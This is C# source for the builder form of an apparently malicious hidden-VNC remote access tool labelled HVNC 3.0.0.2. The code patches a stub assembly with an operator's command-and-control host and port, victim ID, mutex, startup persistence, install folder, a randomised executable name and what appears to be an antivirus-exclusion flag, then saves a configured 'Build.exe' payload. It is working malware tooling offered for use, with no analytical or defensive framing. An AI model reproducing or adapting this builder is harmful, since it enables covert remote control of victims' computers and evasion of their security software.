using Mono.Cecil;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace HVNC
{
    public partial class FrmBuilder : Form
    {

        public static byte[] b;

        public static Random r = new Random();

        public FrmBuilder(string port)
        {
            InitializeComponent();
            txtPORT.Text = port;
            ReadSettings();
        }

        public bool ReadSettings()
        {
            try
            {
                string filePath = (Path.GetDirectoryName(Application.ExecutablePath) + "\\HVNC 3.0.0.2.conf");
                List<string> lines = File.ReadLines(filePath).ToList();

                string ip = lines[5].Replace("host=", null);
                txtIP.Text = ip;

                return true;
            }
            catch
            {
                return false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Build();
        }

        public void Build()
        {

            try
            {
                button2.Enabled = false;


                if (string.IsNullOrWhiteSpace(txtIP.Text) || string.IsNullOrWhiteSpace(txtPORT.Text))
                {
                    MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                else
                {
                    button1.Enabled = false;

                    if (!File.Exists(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) + "\\Stub.bin"))
                    {
                        MessageBox.Show("Stub.bin not found !", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        button1.Enabled = true;
                        return;
                    }


                    AssemblyDefinition module = AssemblyDefinition.ReadAssembly(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) + "\\Stub.bin");

                    foreach (TypeDefinition type in module.MainModule.Types)
                    {
                        if (type.ToString().Contains("Program"))
                        {
                            foreach (var method in type.Methods)
                            {
                                if (method.ToString().Contains("Main"))
                                {
                                    foreach (var instruction in method.Body.Instructions)
                                    {
                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#IPDNS#")
                                        {
                                            instruction.Operand = txtIP.Text;
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#PORT#")
                                        {
                                            instruction.Operand = txtPORT.Text;
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#ID#")
                                        {
                                            instruction.Operand = txtIdentifier.Text;
                                        }


                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#MUTEX#")
                                        {
                                            instruction.Operand = txtMutex.Text;
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#STARTUP#")
                                        {
                                            instruction.Operand = checkBox1.Checked.ToString();
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#PATH#")
                                        {
                                            instruction.Operand = comboBox1.SelectedIndex.ToString();
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#FOLDER#")
                                        {
                                            instruction.Operand = textBox1.Text;
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#FILENAME#")
                                        {
                                            instruction.Operand = textBox2.Text;
                                        }

                                        if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#WDEX#")
                                        {
                                            instruction.Operand = checkBox2.Checked.ToString();
                                        }
                                    }
                                }
                            }
                        }
                    }

                    module.Write(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) + "\\Build.exe");

                    MessageBox.Show("Successfully ! File saved to : " + Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) + "\\Build.exe", "Done !", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }

                SaveSettings();

                this.Close();

            }
            catch (Exception ex)
            {
                MessageBox.Show("Error Build !", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                button1.Enabled = true;
                return;
            }

            
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            txtMutex.Text = RandomMutex(9);
            textBox1.Text = RandomMutex(9);
            textBox2.Text = RandomMutex(9) + ".exe";
        }

        public static Random random = new Random();
        public static string RandomMutex(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string RandomNumber(int length)
        {
            const string chars = "0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            txtMutex.Text = RandomMutex(9);
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            SaveSettings();
        }

        public bool SaveSettings()
        {
            try
            {
                string filePath = (Path.GetDirectoryName(Application.ExecutablePath) + "\\HVNC 3.0.0.2.conf");
                List<string> lines = File.ReadLines(filePath).ToList();
                lines[5] = ("host=" + txtIP.Text);
                File.WriteAllLines(filePath, lines);

                return true;
            }
            catch
            {
                return false;
            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox1.Text = RandomMutex(9);
            textBox2.Text = RandomMutex(9) + ".exe";
        }

    }
}

